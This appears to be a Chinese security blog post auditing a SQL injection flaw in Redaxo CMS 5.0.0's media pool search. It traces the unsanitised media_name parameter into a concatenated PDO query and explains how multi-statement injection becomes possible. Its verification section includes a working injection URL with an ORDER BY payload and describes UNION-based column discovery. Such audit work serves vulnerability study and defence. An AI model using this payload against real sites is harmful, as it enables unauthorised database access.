<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * <span class="doctag">@see</span> rex_request::request()</div><div class="line"> *</div><div class="line"> * <span class="doctag">@package</span> redaxo\core</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">rex_request</span><span class="params">($varname, $vartype = <span class="string">''</span>, $default = <span class="string">''</span>)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">return</span> rex_request::request($varname, $vartype, $default);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>可以看到这个函数实际上是去调用了<code>rex_request</code>类的<code>request</code>方法，于是去找<code>rex_request</code>类的实现代码去，定位到<code>/redaxo-cms-5.0.0/redaxo/src/core/lib/request.php</code>，第38行-50行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line">    * Returns the variable $varname of $_REQUEST and casts the value.</div><div class="line">    *</div><div class="line">    * <span class="doctag">@param</span> string $varname Variable name</div><div class="line">    * <span class="doctag">@param</span> string $vartype Variable type</div><div class="line">    * <span class="doctag">@param</span> mixed  $default Default value</div><div class="line">    *</div><div class="line">    * <span class="doctag">@return</span> mixed</div><div class="line">    */</div><div class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span><span class="params">($varname, $vartype = <span class="string">''</span>, $default = <span class="string">''</span>)</span></span></div><div class="line">   &#123;</div><div class="line">       <span class="keyword">return</span> <span class="keyword">self</span>::arrayKeyCast($_REQUEST, $varname, $vartype, $default);</div><div class="line">   &#125;</div></pre></td></tr></table></figure>
<p>这里又调用了<code>rex_request</code>类自身的<code>arrayKeyCast</code>方法，找到该方法的实现，第168行-194行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line">     * Searches the value $needle in array $haystack and returns the casted value.</div><div class="line">     *</div><div class="line">     * <span class="doctag">@param</span> array      $haystack Array</div><div class="line">     * <span class="doctag">@param</span> string|int $needle   Value to search</div><div class="line">     * <span class="doctag">@param</span> string     $vartype  Variable type</div><div class="line">     * <span class="doctag">@param</span> mixed      $default  Default value</div><div class="line">     *</div><div class="line">     * <span class="doctag">@throws</span> InvalidArgumentException</div><div class="line">     *</div><div class="line">     * <span class="doctag">@return</span> mixed</div><div class="line">     */</div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">arrayKeyCast</span><span class="params">(array $haystack, $needle, $vartype, $default = <span class="string">''</span>)</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (!is_scalar($needle)) &#123;<span class="comment">// 判断$needle是否是标量</span></div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidArgumentException(<span class="string">'Scalar expected for $needle in arrayKeyCast()!'</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (array_key_exists($needle, $haystack)) &#123;<span class="comment">// 如果$haystack含有$needle键</span></div><div class="line">            <span class="keyword">return</span> rex_type::cast($haystack[$needle], $vartype);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> ($default === <span class="string">''</span>) &#123;</div><div class="line">            <span class="keyword">return</span> rex_type::cast($default, $vartype);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> $default;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>注意到传给<code>arrayKeyCast</code>的<code>$haystack</code>参数值是<code>$_REQUEST</code>来的，<code>$needle</code>参数值是<code>media_name</code>，<code>$vartype</code>参数值是<code>string</code>，所以进入了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line"><span class="keyword">if</span> (array_key_exists($needle, $haystack)) &#123;<span class="comment">// 如果$haystack含有$needle键</span></div><div class="line">            <span class="keyword">return</span> rex_type::cast($haystack[$needle], $vartype);</div><div class="line">        &#125;</div><div class="line">...</div></pre></td></tr></table></figure>
<p>后直接调用了<code>rex_type</code>类的<code>cast</code>方法校验变量类型，找到<code>cast</code>方法的实现代码，<code>/redaxo-cms-5.0.0/redaxo/src/core/lib/util/type.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line">     * Casts the variable $var to $vartype.</div><div class="line">     *</div><div class="line">     * Possible types:</div><div class="line">     *  - 'bool' (or 'boolean')</div><div class="line">     *  - 'int' (or 'integer')</div><div class="line">     *  - 'double'</div><div class="line">     *  - 'string'</div><div class="line">     *  - 'float'</div><div class="line">     *  - 'real'</div><div class="line">     *  - 'object'</div><div class="line">     *  - 'array'</div><div class="line">     *  - 'array[&lt;type&gt;]', e.g. 'array[int]'</div><div class="line">     *  - '' (don't cast)</div><div class="line">     *  - a callable</div><div class="line">     *  - array(</div><div class="line">     *      array(&lt;key&gt;, &lt;vartype&gt;, &lt;default&gt;),</div><div class="line">     *      array(&lt;key&gt;, &lt;vartype&gt;, &lt;default&gt;),</div><div class="line">     *      ...</div><div class="line">     *    )</div><div class="line">     *</div><div class="line">     * <span class="doctag">@param</span> mixed $var     Variable to cast</div><div class="line">     * <span class="doctag">@param</span> mixed $vartype Variable type</div><div class="line">     *</div><div class="line">     * <span class="doctag">@throws</span> InvalidArgumentException</div><div class="line">     *</div><div class="line">     * <span class="doctag">@return</span> mixed Castet value</div><div class="line">     */</div><div class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">cast</span><span class="params">($var, $vartype)</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (is_string($vartype)) &#123;</div><div class="line">            $casted = <span class="keyword">true</span>;</div><div class="line">            <span class="keyword">switch</span> ($vartype) &#123;</div><div class="line">                <span class="comment">// ---------------- PHP types</span></div><div class="line">                <span class="keyword">case</span> <span class="string">'bool'</span>:</div><div class="line">                <span class="keyword">case</span> <span class="string">'boolean'</span>:</div><div class="line">                    $var = (boolean) $var;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> <span class="string">'int'</span>:</div><div class="line">                <span class="keyword">case</span> <span class="string">'integer'</span>:</div><div class="line">                    $var = (int) $var;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> <span class="string">'double'</span>:</div><div class="line">                    $var = (double) $var;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> <span class="string">'float'</span>:</div><div class="line">                <span class="keyword">case</span> <span class="string">'real'</span>:</div><div class="line">                    $var = (float) $var;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> <span class="string">'string'</span>:</div><div class="line">                    $var = (string) $var;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> <span class="string">'object'</span>:</div><div class="line">                    $var = (object) $var;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> <span class="string">'array'</span>:</div><div class="line">                    <span class="keyword">if</span> (<span class="string">''</span> === $var) &#123;</div><div class="line">                        $var = [];</div><div class="line">                    &#125; <span class="keyword">else</span> &#123;</div><div class="line">                        $var = (<span class="keyword">array</span>) $var;</div><div class="line">                    &#125;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line"></div><div class="line">                    <span class="comment">// kein Cast, nichts tun</span></div><div class="line">                <span class="keyword">case</span> <span class="string">''</span>: <span class="keyword">break</span>;</div><div class="line"></div><div class="line">                <span class="keyword">default</span>:</div><div class="line">                    <span class="comment">// check for array with generic type</span></div><div class="line">                    <span class="keyword">if</span> (strpos($vartype, <span class="string">'array['</span>) === <span class="number">0</span>) &#123;</div><div class="line">                        <span class="keyword">if</span> (<span class="keyword">empty</span>($var)) &#123;</div><div class="line">                            $var = [];</div><div class="line">                        &#125; <span class="keyword">else</span> &#123;</div><div class="line">                            $var = (<span class="keyword">array</span>) $var;</div><div class="line">                        &#125;</div><div class="line"></div><div class="line">                        <span class="comment">// check if every element in the array is from the generic type</span></div><div class="line">                        $matches = [];</div><div class="line">                        <span class="keyword">if</span> (preg_match(<span class="string">'@array\[([^\]]*)\]@'</span>, $vartype, $matches)) &#123;</div><div class="line">                            <span class="keyword">foreach</span> ($var <span class="keyword">as</span> $key =&gt; $value) &#123;</div><div class="line">                                <span class="keyword">try</span> &#123;</div><div class="line">                                    $var[$key] = <span class="keyword">self</span>::cast($value, $matches[<span class="number">1</span>]);</div><div class="line">                                &#125; <span class="keyword">catch</span> (InvalidArgumentException $e) &#123;</div><div class="line">                                    <span class="comment">// Evtl Typo im vartype, mit urspr. typ als fehler melden</span></div><div class="line">                                    <span class="keyword">throw</span> <span class="keyword">new</span> InvalidArgumentException(<span class="string">'Unexpected vartype "'</span> . $vartype . <span class="string">'" in cast()!'</span>);</div><div class="line">                                &#125;</div><div class="line">                            &#125;</div><div class="line">                        &#125; <span class="keyword">else</span> &#123;</div><div class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidArgumentException(<span class="string">'Unexpected vartype "'</span> . $vartype . <span class="string">'" in cast()!'</span>);</div><div class="line">                        &#125;</div><div class="line">                    &#125; <span class="keyword">else</span> &#123;</div><div class="line">                        $casted = <span class="keyword">false</span>;</div><div class="line">                    &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> ($casted) &#123;</div><div class="line">                <span class="keyword">return</span> $var;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (is_callable($vartype)) &#123;</div><div class="line">            $var = call_user_func($vartype, $var);</div><div class="line">        &#125; <span class="keyword">elseif</span> (is_array($vartype)) &#123;</div><div class="line">            $var = <span class="keyword">self</span>::cast($var, <span class="string">'array'</span>);</div><div class="line">            $newVar = [];</div><div class="line">            <span class="keyword">foreach</span> ($vartype <span class="keyword">as</span> $cast) &#123;</div><div class="line">                <span class="keyword">if</span> (!is_array($cast) || !<span class="keyword">isset</span>($cast[<span class="number">0</span>])) &#123;</div><div class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> InvalidArgumentException(<span class="string">'Unexpected vartype in cast()!'</span>);</div><div class="line">                &#125;</div><div class="line">                $key = $cast[<span class="number">0</span>];</div><div class="line">                $innerVartype = <span class="keyword">isset</span>($cast[<span class="number">1</span>]) ? $cast[<span class="number">1</span>] : <span class="string">''</span>;</div><div class="line">                <span class="keyword">if</span> (array_key_exists($key, $var)) &#123;</div><div class="line">                    $newVar[$key] = <span class="keyword">self</span>::cast($var[$key], $innerVartype);</div><div class="line">                &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>($cast[<span class="number">2</span>])) &#123;</div><div class="line">                    $newVar[$key] = <span class="keyword">self</span>::cast(<span class="string">''</span>, $innerVartype);</div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                    $newVar[$key] = $cast[<span class="number">2</span>];</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            $var = $newVar;</div><div class="line">        &#125; <span class="keyword">elseif</span> (is_string($vartype)) &#123;</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidArgumentException(<span class="string">'Unexpected vartype "'</span> . $vartype . <span class="string">'" in cast()!'</span>);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidArgumentException(<span class="string">'Unexpected vartype in cast()!'</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> $var;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>在<code>$vartype</code>为<code>string</code>的时候，直接强制转换了下就break跳出，return了，全部过程没看到安全过滤函数的干预，所以是存在严重SQL注入问题的。</p>
<h1 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h1><p>访问</p>
<pre><code>http://localhost:8888/redaxo-cms-5.0.0/redaxo/index.php?page=mediapool/media&amp;rex_file_category=0
</code></pre><p>在该页面右侧搜索框搜索任意字符串，post数据中参数<code>media_name</code>即为注入点，结合之前的分析，后端接收数据的方式为<code>$_REQUEST</code>，那么将<code>media_name</code>参数直接带到url后面以get方式请求也是可以被后端获取的。</p>
<pre><code>http://localhost:8888/redaxo-cms-5.0.0/redaxo/index.php?page=mediapool/media&amp;rex_file_category=0&amp;media_name=abc%27)%20ORDER%20BY%2018+--+
</code></pre><p><code>order by 18</code>报错，那么列的数目就是<code>17</code>，使用<code>union select</code>语句把页面回显位置显示出来</p>
<p><img src="/images/redaxo-1.png" alt="huixian"></p>
<p>可以看到回显位置有<code>10，14，16</code></p>
<p><img src="/images/redaxo-2.png" alt="poc"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个漏洞比较有意思的地方来了，我留意到该cms选择的<code>pdo</code>方式连接数据库，那么怎么会出这样的sql注入问题呢？说完就抽了自己一大嘴瓜子，为什么不会出这样的sql注入问题呢？毕竟代码是人写的，下面就分析下为什么造成了sql注入。</p>
<p>首先这个锅是程序员的，明明选择了<code>pdo</code>方式连接数据库，但是写sql语句的时候却直接拼接了参数，而不是采用pdo的参数绑定或者<code>prepare</code>方式，从而造成了注入问题。</p>
<p>定位到<code>/redaxo-cms-5.0.0/redaxo/src/addons/mediapool/pages/media.php</code>，第600行-608行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$qry = <span class="string">'SELECT * FROM '</span> . $addTable . rex::getTablePrefix() . <span class="string">'media f WHERE '</span> . $where . <span class="string">' ORDER BY f.updatedate desc, f.id desc'</span>;</div><div class="line"></div><div class="line">    <span class="comment">// ----- EXTENSION POINT</span></div><div class="line">    $qry = rex_extension::registerPoint(<span class="keyword">new</span> rex_extension_point(<span class="string">'MEDIA_LIST_QUERY'</span>, $qry, [</div><div class="line">        <span class="string">'category_id'</span> =&gt; $rex_file_category,</div><div class="line">    ]));</div><div class="line">    $files = rex_sql::factory();</div><div class="line"><span class="comment">//   $files-&gt;setDebug();</span></div><div class="line">    $files-&gt;setQuery($qry);</div></pre></td></tr></table></figure>
<p>看到<code>$qry</code>变量拼接了<code>$where</code>变量，而<code>$where</code>里面又拼接了<code>$media_name</code>变量，第586行</p>
<pre><code>$where = &quot;(f.filename LIKE &apos;%&quot; . $media_name . &quot;%&apos; OR f.title LIKE &apos;%&quot; . $media_name . &quot;%&apos;)&quot;;
</code></pre><p>最后sql语句$qry变量传入了setQuery函数，找到setQuery函数的实现，定位到<code>/redaxo-cms-5.0.0/redaxo/src/core/lib/sql/sql.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line">     * Executes the given sql-query.</div><div class="line">     *</div><div class="line">     * If parameters will be provided, a prepared statement will be executed.</div><div class="line">     *</div><div class="line">     * example 1:</div><div class="line">     *    $sql-&gt;setQuery('SELECT * FROM mytable where id=:id, 'array('id' =&gt; 3));</div><div class="line">     *</div><div class="line">     * <span class="doctag">NOTE:</span> named-parameters/?-placeholders are not supported in LIMIT clause!</div><div class="line">     *</div><div class="line">     * <span class="doctag">@param</span> string $query  The sql-query</div><div class="line">     * <span class="doctag">@param</span> array  $params An optional array of statement parameter</div><div class="line">     *</div><div class="line">     * <span class="doctag">@return</span> $this</div><div class="line">     *</div><div class="line">     * <span class="doctag">@throws</span> rex_sql_exception on errors</div><div class="line">     */</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setQuery</span><span class="params">($query, array $params = [])</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="comment">// Alle Werte zuruecksetzen</span></div><div class="line">        <span class="keyword">$this</span>-&gt;flush();</div><div class="line">        <span class="keyword">$this</span>-&gt;query = $query;</div><div class="line">        <span class="keyword">$this</span>-&gt;params = $params;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($params)) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;prepareQuery($query);</div><div class="line">            <span class="keyword">$this</span>-&gt;execute($params);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">try</span> &#123;</div><div class="line">                <span class="keyword">$this</span>-&gt;stmt = <span class="keyword">self</span>::$pdo[<span class="keyword">$this</span>-&gt;DBID]-&gt;query($query);</div><div class="line">                <span class="keyword">$this</span>-&gt;rows = <span class="keyword">$this</span>-&gt;stmt-&gt;rowCount();</div><div class="line">            &#125; <span class="keyword">catch</span> (PDOException $e) &#123;</div><div class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> rex_sql_exception(<span class="string">'Error while executing statement "'</span> . $query . <span class="string">'! '</span> . $e-&gt;getMessage());</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;debug) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;printError($query, $params);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>由于没有传递<code>$params</code>参数，所以if语句直接进入else逻辑，使用<code>query</code>直接执行了sql语句中我们拼接的恶意代码。</p>
<p>到这里其实还没完，又惊奇的发现<code>sqlmap</code>提供的<code>payload</code>里面使用了多语句，这让我想到了<em>php+mysql</em>多语句执行，mysql本身从<code>4.1</code>版本就已经开始支持多语句执行了，只是php自身限制了这种用法，虽然<code>connect</code>的时候可以设置<code>CLIENT_MULTI_STATEMENTS</code>，但是php在<code>mysql_query/mysqli_query</code>函数实现的源码级别仍然会去除掉该设置。但<code>pdo</code>方式连数据后默认是允许多语句执行的，但并不是完全没限制，因为<code>pdo</code>方式操作数据库都是采用参数绑定预编译sql语句的，而这种绑定是在客户端执行的，这种情况是不需要多语句执行的。以前在zone里面有一篇<a href="http://zone.wooyun.org/content/50" target="_blank" rel="external">帖子</a></p>
<blockquote>
<p>“真正可以利用的多语句注射，只能是存在于利用PDO连接数据库，并直接使用exec或者query函数进行执行sql语句的地方”</p>
</blockquote>
<p>由于恰巧该cms在执行sql语句的时候未严格执行<code>pdo</code>标准使用参数绑定方式，而采用了直接拼接参数到sql语句，执行的时候直接使用了<code>query</code>函数，因此造成了多语句执行。</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;来源&lt;a href=&quot;https://www.exploit-db.com/exploits/39459/&quot;&gt;https://www.exploit-db.com/exploits/39459/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h1&gt;&lt;p&gt;在逛exploit-db的时候，发现这个漏洞有点意思，就拿过来自己分析了下。Redaxo CMS是一套开源的Web门户内容管理系统（CMS），该系统支持自定义模块、插件扩展、项目备份等。&lt;/p&gt;
&lt;h1 id=&quot;审计&quot;&gt;&lt;a href=&quot;#审计&quot; class=&quot;headerlink&quot; title=&quot;审计&quot;&gt;&lt;/a&gt;审计&lt;/h1&gt;&lt;p&gt;根据报错信息可以定位到该文件，&lt;code&gt;/redaxo-cms-5.0.0/redaxo/src/addons/mediapool/pages/media.php&lt;/code&gt;，第582行-608行&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; $where = &lt;span class=&quot;string&quot;&gt;&#39;f.category_id=&#39;&lt;/span&gt; . $rex_file_category;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    $addTable = &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ($media_name != &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        $media_name = str_replace([&lt;span class=&quot;string&quot;&gt;&#39;_&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;%&#39;&lt;/span&gt;], [&lt;span class=&quot;string&quot;&gt;&#39;\_&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;\%&#39;&lt;/span&gt;], $media_name);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        $where = &lt;span class=&quot;string&quot;&gt;&quot;(f.filename LIKE &#39;%&quot;&lt;/span&gt; . $media_name . &lt;span class=&quot;string&quot;&gt;&quot;%&#39; OR f.title LIKE &#39;%&quot;&lt;/span&gt; . $media_name . &lt;span class=&quot;string&quot;&gt;&quot;%&#39;)&quot;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (rex_addon::get(&lt;span class=&quot;string&quot;&gt;&#39;mediapool&#39;&lt;/span&gt;)-&amp;gt;getConfig(&lt;span class=&quot;string&quot;&gt;&#39;searchmode&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;local&#39;&lt;/span&gt;) != &lt;span class=&quot;string&quot;&gt;&#39;global&#39;&lt;/span&gt; &amp;amp;&amp;amp; $rex_file_category != &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            $addTable = rex::getTablePrefix() . &lt;span class=&quot;string&quot;&gt;&#39;media_category c, &#39;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            $where .= &lt;span class=&quot;string&quot;&gt;&#39; AND f.category_id = c.id &#39;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            $where .= &lt;span class=&quot;string&quot;&gt;&quot; AND (c.path LIKE &#39;%|&quot;&lt;/span&gt; . $rex_file_category . &lt;span class=&quot;string&quot;&gt;&quot;|%&#39; OR c.id=&quot;&lt;/span&gt; . $rex_file_category . &lt;span class=&quot;string&quot;&gt;&#39;) &#39;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($args[&lt;span class=&quot;string&quot;&gt;&#39;types&#39;&lt;/span&gt;])) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        $types = [];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;foreach&lt;/span&gt; (explode(&lt;span class=&quot;string&quot;&gt;&#39;,&#39;&lt;/span&gt;, $args[&lt;span class=&quot;string&quot;&gt;&#39;types&#39;&lt;/span&gt;]) &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; $type) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            $types[] = &lt;span class=&quot;string&quot;&gt;&#39;LOWER(RIGHT(f.filename, LOCATE(&quot;.&quot;, REVERSE(f.filename))-1))=&quot;&#39;&lt;/span&gt; . strtolower(htmlspecialchars($type)) . &lt;span 